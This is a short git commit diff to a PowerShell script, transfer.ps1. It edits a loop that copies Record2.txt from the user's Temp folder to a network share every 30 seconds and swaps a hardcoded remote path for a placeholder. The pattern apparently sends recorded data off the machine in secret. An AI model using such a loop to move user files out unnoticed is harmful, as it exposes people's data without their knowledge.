6b7e946f02f6ebabc06864b68b790ba31b4f9d7a
AllenKoholic <42421033+AllenKoholic@users.noreply.github.com>
2023-05-10 11:17:50 -0700

    Update transfer.ps1

--- transfer.ps1
+++ transfer.ps1
@@ -3,7 +3,7 @@ cd $env:USERPROFILE"\AppData\Local\Temp"
 #Write-Output 'start' + $i
 Do
 {
-Copy-Item -Path $env:USERPROFILE"\AppData\Local\Temp\Record2.txt" -Destination '\\JACKH-LAPTOP\Users\JackH\Documents\Test\Record2.txt';
+Copy-Item -Path $env:USERPROFILE"\AppData\Local\Temp\Record2.txt" -Destination '{PATH}Record2.txt';
 start-sleep -s 30
 $proc = Get-Process
 #Write-Output $proc
